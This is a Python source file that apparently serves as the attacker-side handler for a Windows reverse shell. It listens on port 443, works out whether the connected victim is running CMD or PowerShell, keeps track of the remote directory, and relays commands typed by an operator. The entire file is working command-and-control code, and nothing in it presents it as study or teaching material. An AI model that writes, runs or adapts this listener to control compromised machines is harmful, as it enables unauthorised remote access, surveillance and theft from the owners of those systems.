import socket
import threading
import os

# Configuration
IP = '0.0.0.0'
PORT = 443

def handle_client(connection, address):
    print(f"[+] Connection established from {address}")

    # Detect PowerShell or CMD
    shell_type = 'CMD'  # Assume CMD first
    connection.send('cd'.encode())  # Get initial directory
    current_directory = connection.recv(4096).decode().strip()
    
    if "PSVersionTable" in current_directory:  # Checking for PowerShell
        shell_type = 'PowerShell'
        current_directory = connection.recv(4096).decode().strip()

    print(f"[+] Initial directory: {current_directory} ({shell_type})")

    while True:
        try:
            # Command input from server user
            command = input("Shell> ").strip()
            
            # Clean exit for both server and client
            if command.lower() == "exit":
                connection.send("exit".encode())
                break
            
            # Handle local directory state changes (e.g., "cd ..")
            if command.startswith("cd "):
                new_directory = command[3:].strip()
                
                # If new_directory is "\" or an absolute path, set the path directly
                if new_directory == "\\":
                    current_directory = "C:\\"
                elif ":" in new_directory:
                    current_directory = os.path.normpath(new_directory)  # Absolute path
                elif new_directory == "..":
                    # Move up one directory level
                    current_directory = os.path.dirname(current_directory)
                else:
                    # Normal relative path handling
                    current_directory = os.path.normpath(os.path.join(current_directory, new_directory))

                print(f"[Server State Updated] Current directory: {current_directory}")
                continue

            
            # Prepare command with the current directory context for sensitive commands
            if command in ["dir", "ls", "gci"]:
                if shell_type == 'PowerShell':
                    command = f"cd '{current_directory}'; {command}"
                else:
                    command = f"cd {current_directory} && {command}"
            
            # Send command and display response
            connection.send(command.encode())
            response = connection.recv(4096).decode()
            print(response)
        
        except Exception as e:
            print(f"[!] Error: {e}")
            break

    # Close connection on server
    connection.close()
    print("[+] Connection closed.")

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((IP, PORT))
    server.listen(5)
    print(f"[*] Listening on {IP}:{PORT}")

    while True:
        client_socket, client_address = server.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_handler.start()

if __name__ == "__main__":
    start_server()
